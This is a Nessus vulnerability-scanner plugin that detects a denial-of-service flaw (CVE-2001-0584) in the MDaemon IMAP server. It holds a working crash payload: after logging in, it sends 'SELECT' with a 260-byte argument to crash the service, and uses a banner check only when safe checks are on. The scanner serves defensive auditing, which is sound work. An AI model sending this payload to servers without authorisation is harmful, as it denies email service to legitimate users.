#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref: <nitr0s@hotmail.com>
#
#  This script is released under the GNU GPL v2

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (6/19/09)


include("compat.inc");

if(description)
{
 script_id(14827);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2001-0584");
 script_bugtraq_id(2508);
 script_xref(name:"OSVDB", value:"12045");
 
 script_name(english:"MDaemon IMAP Server Multiple Command Local DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by a denial-of-service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the MDaemon IMAP server.

It is possible to crash the remote version of this software by 
sending a too long argument to the 'SELECT' or 'EXAMINE' commands.

This problem allows an attacker to make the remote service crash, thus 
preventing legitimate users from receiving e-mails." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-03/0365.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:L/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Crashes the remote imap server");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"Windows");
 script_dependencie("find_service1.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("imap_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/imap");
if(!port)port = 143;

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

safe_checks = 0;
if((acct == "")||(pass == ""))safe_checks = 1;
if ( safe_checks() ) safe_checks = 1;

if ( safe_checks )
{
 banner = get_imap_banner ( port:port );
 if ( ! banner ) exit(0);
 #* OK company.mail IMAP4rev1 MDaemon 3.5.6 ready
 if(ereg(pattern:".* IMAP4.* MDaemon ([0-5]\.|6\.[0-7]\.) ready", string:banner)) security_note(port);
 exit(0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    banner = recv_line(socket:soc, length:4096);
    if ("MDaemon" >!< banner ) exit(0);
    #need a valid account to test this issue
    s = string("? LOGIN ", acct, " ", pass, "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);
      
    s = string("? SELECT ", crap(260), "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);
      
    close(soc);
  
    soc2 = open_sock_tcp(port);
    if(!soc2)security_note(port);
    else close(soc2);
 }
}
